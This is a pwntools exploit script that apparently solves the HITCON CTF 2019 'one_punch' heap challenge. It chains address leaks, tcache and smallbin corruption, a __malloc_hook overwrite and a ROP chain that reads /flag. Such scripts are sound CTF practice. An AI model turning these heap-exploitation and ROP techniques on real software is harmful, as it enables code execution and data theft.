from pwn import *

#r = remote("node3.buuoj.cn", 28996)
r = process("./hitcon_ctf_2019_one_punch")

context(log_level = 'debug', arch = 'amd64', os = 'linux')
DEBUG = 0
if DEBUG:
	gdb.attach(r, 
	'''	
	where
	''')

elf = ELF("./hitcon_ctf_2019_one_punch")
libc = elf.libc

menu = "> "
def add(index, content):
	r.recvuntil(menu)
	r.sendline('1')
	r.recvuntil("idx: ")
	r.sendline(str(index))
	r.recvuntil("hero name: ")
	r.send(content)

def delete(index):
	r.recvuntil(menu)
	r.sendline('4')
	r.recvuntil("idx: ")
	r.sendline(str(index))

def edit(index, content):
	r.recvuntil(menu)
	r.sendline('2')
	r.recvuntil("idx: ")
	r.sendline(str(index))
	r.recvuntil("hero name: ")
	r.send(content)

def show(index):
	r.recvuntil(menu)
	r.sendline('3')
	r.recvuntil("idx: ")
	r.sendline(str(index))

def back_door(content):
	r.recvuntil(menu)
	r.sendline('50056\x00\x00')
	sleep(1)
	r.send(content)

# fill full tcache size 0x410
for i in range(7):
	add(0, 'a'*0x400)
	delete(0)

# fill 6 in tcache size 0x100
for i in range(6):
	add(1,'b'*0xf0)
	delete(1)

show(0)
r.recvuntil("hero name: ")
last_chunk_addr = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
heap_addr = last_chunk_addr - 0x16B0
success("heap_base:"+hex(heap_addr))

add(0, 'a'*0x400)
add(1, 'b'*0x300)
delete(0)
show(0)
r.recvuntil("hero name: ")
malloc_hook = u64(r.recvuntil('\n').strip().ljust(8, '\x00')) - 0x60 - 0x10
libc.address = malloc_hook - libc.sym['__malloc_hook']
syscall = libc.address + 0x000000000010D022
add_rsp = libc.address + 0x000000000008cfd6
leave = libc.address + 0x0000000000058373
pop_rdi_ret = libc.address + 0x0000000000026542
pop_rsi_ret = libc.address + 0x0000000000026f9e
pop_rdx_ret = libc.address + 0x000000000012bda6
pop_rax_ret = libc.address + 0x0000000000047cf8
success("libc:"+hex(libc.address))

add(1, 'b'*0x300)
add(1, 'b'*0x300)#smallbin1

add(0, 'a'*0x400)
add(1, 'b'*0x300)
delete(0)
add(1, 'b'*0x300)
add(1, 'b'*0x300)#smallbin2

payload = '\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x27D0)+p64(heap_addr+0x30-5-0x10)
edit(0, payload)


add(1, '/flag'+'\x00'*0x100)
for i in range(7):
	add(1, 'b'*0x217)
	delete(1)
edit(1, p64(malloc_hook))
add(1, 'b'*0xf0)
back_door(p64(malloc_hook))
back_door(p64(add_rsp))

file_name_addr = heap_addr + 0x3930
flag_addr = heap_addr + 0x3940
ROP_chain = p64(pop_rdi_ret)
ROP_chain += p64(file_name_addr)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(0)
ROP_chain += p64(pop_rax_ret)
ROP_chain += p64(2)
ROP_chain += p64(syscall)
#ROP_chain += p64(libc.symbols['open'])
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(3)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc.symbols['read'])
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(1)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc.symbols['write'])

add(1, ROP_chain)
r.interactive()
